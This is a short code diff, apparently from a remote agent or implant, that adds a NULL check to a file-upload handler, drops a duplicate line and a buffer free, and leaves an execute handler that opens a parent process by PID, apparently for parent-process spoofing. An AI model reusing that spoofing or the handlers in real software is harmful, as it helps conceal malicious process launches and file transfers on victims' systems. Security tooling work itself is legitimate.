@@ -152,7 +152,6 @@ PENVELOPE ExecuteHandler
 	dwParentPid = (DWORD)UnmarshaledData[5];
 	SecureZeroMemory(&StartupInfo, sizeof(StartupInfo));
 	SecureZeroMemory(&ProcessInfo, sizeof(ProcessInfo));
-
 	if (dwParentPid > 0) {
 		hParentProcess = OpenProcess(PROCESS_CREATE_PROCESS, FALSE, dwParentPid);
 		if (hParentProcess == NULL) {
@@ -335,9 +334,12 @@ PENVELOPE UploadHandler
 	}
 
 	pData = ((PBUFFER*)UnmarshaledData)[1];
+	if (pData == NULL) {
+		goto CLEANUP;
+	}
+
 	UnmarshaledData[1] = NULL;
 	IsDirectory = ((PBOOL)UnmarshaledData)[3];
-	UnmarshaledData[1] = NULL;
 	if (IsDirectory) {
 		GenerateTempPathW(NULL, L".zip", NULL, &lpZipPath);
 		if (!WriteToFile(lpZipPath, pData->pBuffer, pData->cbBuffer)) {
@@ -365,7 +367,6 @@ CLEANUP:
 		FreeBuffer((PBUFFER)UnmarshaledData[0]);
 		FreeBuffer((PBUFFER)UnmarshaledData[1]);
 		FreeBuffer((PBUFFER)UnmarshaledData[2]);
-		FreeBuffer((PBUFFER)UnmarshaledData[3]);
 
 		FREE(UnmarshaledData);
 	}
